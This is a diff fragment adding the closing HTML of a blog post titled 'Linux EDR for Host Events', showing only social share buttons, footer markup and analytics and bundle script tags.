+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f;title=Linux%20EDR%20for%20Host%20Events" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Linux%20EDR%20for%20Host%20Events%20https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f&amp;t=Linux%20EDR%20for%20Host%20Events" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Linux%20EDR%20for%20Host%20Events&amp;url=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.d96dc9197435c7dcc63d512bceea911b84103cacefdc682a4153b249da02faa7545001728de6ad84557229050a79bed5e55964e16f97079122cfad4cebcb0c96.js" integrity="sha512-2W3JGXQ1x9zGPVErzuqRG4QQPKzv3GgqQVOySdoC&#43;qdUUAFyjeathFVyKQUKeb7V5Vlk4W&#43;XB5Eiz61M68sMlg=="></script>
+
+
+
+        <script src='/posts/js/caption.js'></script>
+        <script data-goatcounter="https://mathscantor.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js">console.log("Goat Analytics Loaded");</script>
+    </body>
+</html>
